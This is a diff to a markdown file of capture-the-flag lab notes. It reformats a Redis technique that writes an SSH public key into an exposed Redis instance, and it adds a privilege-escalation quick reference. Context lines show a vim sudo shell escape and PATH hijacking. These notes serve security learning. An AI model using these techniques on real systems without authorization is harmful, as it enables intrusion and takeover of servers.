@@ -957,7 +957,6 @@ export PATH=/tmp:$PATH
 - Flask session cookies can be tampered with if secret key is known
 
 ---
----
 
 
 ## Overpass Series
@@ -1227,11 +1226,7 @@ redis-cli -h 10.10.x.x info
 
 # Write SSH key to redis
 ssh-keygen -t rsa -f key
-(echo -e "
-
-"; cat key.pub; echo -e "
-
-") > key.txt
+(echo -e "\n\n"; cat key.pub; echo -e "\n\n") > key.txt
 cat key.txt | redis-cli -h 10.10.x.x -x set ssh_key
 
 # Set Redis dir and dbfilename
@@ -1456,6 +1451,14 @@ sudo vim -c ':!/bin/sh'
 - Always check image metadata and hidden data
 
 ---
+
+## 🛠️ Quick Reference
+
+### Common Privesc Paths
+| Method | Command |
+|--------|---------|
+| SUID Binary | `find / -perm -4000 -type f` |
+| Sudo Misconfig | `sudo -l` |
 
 ## 🛠️ Methodology Checklist
 
